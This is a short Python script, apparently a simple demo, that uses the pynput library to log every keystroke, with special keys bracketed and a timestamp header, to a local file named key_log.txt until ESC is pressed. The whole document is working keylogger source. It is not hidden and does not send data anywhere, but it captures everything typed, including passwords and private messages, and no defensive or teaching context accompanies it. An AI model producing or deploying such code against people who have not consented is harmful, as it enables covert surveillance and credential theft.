from pynput import keyboard
from datetime import datetime

LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        # Printable keys
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (space, enter, etc.)
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on ESC key
        return False

print("🔐 Keylogger started. Press ESC to stop.")

# Add timestamp to log file
with open(LOG_FILE, "a") as f:
    f.write(f"\n\n--- Logging started: {datetime.now()} ---\n")

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
